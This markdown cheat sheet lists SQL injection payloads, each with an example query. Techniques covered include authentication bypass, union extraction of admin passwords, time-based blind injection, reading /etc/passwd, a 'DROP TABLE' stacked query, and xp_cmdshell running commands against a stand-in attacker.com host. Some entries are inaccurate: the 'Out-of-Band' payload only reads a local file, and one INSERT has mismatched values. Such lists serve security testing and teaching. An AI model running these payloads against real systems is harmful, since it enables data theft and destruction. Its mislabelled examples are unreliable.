
---

## 🚀 Queries for Testing

Below are some sample SQL injection queries for different types of attacks. These queries can be used for testing and securing applications against SQL injection vulnerabilities.

---

## 🚀 Boolean-Based SQL Injection
Bypass authentication or extract information using `OR` conditions.

```sql
' OR 1=1; --
```
**Example:**
```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR 1=1; --';
```

---

## 🚀 Union-Based SQL Injection
Extract data from other tables by combining the result with a `UNION`.

```sql
' UNION SELECT username, password FROM admin_users; --
```
**Example:**
```sql
SELECT id, username FROM users WHERE id = 1 UNION SELECT id, password FROM admin_users;
```

---

## 🚀 Error-Based SQL Injection
Trigger database errors to reveal information.

```sql
' AND 1=CONVERT(int, (SELECT @@version)); --
```
**Example:**
```sql
SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version)); --
```

---

## 🚀 Blind (Time-Based) SQL Injection
Infer information by checking server response time.

```sql
' OR IF(1=1, SLEEP(5), 0); --
```
**Example:**
```sql
SELECT * FROM users WHERE username = 'admin' AND IF(1=1, SLEEP(5), 0); --
```

---

## 🚀 Out-of-Band SQL Injection
Send data to an external server using network calls.

```sql
' UNION SELECT LOAD_FILE('/etc/passwd'); --
```
**Example:**
```sql
SELECT * FROM users WHERE username = 'admin' UNION SELECT LOAD_FILE('/etc/passwd'); --
```

---

## 🚀 Stacked Queries (Batch Execution)
Execute multiple statements by chaining with `;`.

```sql
'; DROP TABLE users; --
```
**Example:**
```sql
INSERT INTO orders (product, quantity, price) VALUES ('story', 58); DROP TABLE orders; --
```

---

## 🚀 Extract Database Info (Metadata)
Get table structure or other metadata.

```sql
' UNION SELECT table_name FROM information_schema.tables; --
```
**Example:**
```sql
SELECT username FROM users UNION SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';
```

---

## 🚀 Command Injection via xp_cmdshell
Execute system commands (on MS SQL Server).

```sql
' ; EXEC xp_cmdshell('ping -n 1 attacker.com'); --
```
**Example:**
```sql
SELECT * FROM users WHERE id = 1; EXEC xp_cmdshell('ping -n 1 attacker.com'); --
```

---

## 🚀 Cast-Based Injection
Exploit type casting to extract information.

```sql
' AND 1=CAST('abc' AS int); --
```
**Example:**
```sql
SELECT * FROM users WHERE username = 'admin' AND CAST('abc' AS int) = 1;
```

---

## 🚀 Subquery Injection
Extract nested information using subqueries.

```sql
' AND (SELECT password FROM admin WHERE id=1) = 'admin'; --
```
**Example:**
```sql
SELECT * FROM users WHERE username = 'admin' AND (SELECT password FROM admin WHERE id=1) = 'admin'; --
```

---

**⚠️ Disclaimer:** Use these queries for educational and testing purposes only. Do not use them for malicious intent. 

---

